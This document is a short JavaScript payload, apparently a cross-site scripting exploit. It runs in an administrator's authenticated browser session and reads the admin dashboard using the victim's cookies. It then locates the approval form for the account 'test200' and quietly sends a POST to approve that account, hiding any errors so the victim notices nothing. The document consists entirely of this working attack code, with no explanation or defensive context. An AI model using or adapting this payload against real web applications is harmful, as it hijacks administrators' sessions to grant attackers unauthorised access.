(async () => {
  try {
    const html = await (await fetch('/admin/dashboard', { credentials: 'include' })).text();
    // Prefer DOMParser if available
    let userId;
    try {
      const doc = new DOMParser().parseFromString(html, 'text/html');
      const items = Array.from(doc.querySelectorAll('li'));
      const target = items.find(li => li.textContent && li.textContent.includes('test200'));
      if (target) {
        const form = target.querySelector('form[action^="/admin/approve/"]');
        if (form) userId = form.action.match(/\/admin\/approve\/(.+)$/)[1];
      }
    } catch {}
    if (!userId) {
      // Fallback: global regex scan for approve actions, then nearby username match
      const actions = [...html.matchAll(/<form[^>]*action="(\/admin\/approve\/[^"]+)"[^>]*>/gi)].map(m => m[1]);
      for (const a of actions) {
        const i = html.indexOf(a);
        const window = html.slice(Math.max(0, i - 300), i + 300);
        if (window.includes('test200')) { userId = a.split('/').pop(); break; }
      }
    }
    if (!userId) return;
    await fetch(`/admin/approve/${userId}`, { method: 'POST', credentials: 'include' });
  } catch (e) {}
})();
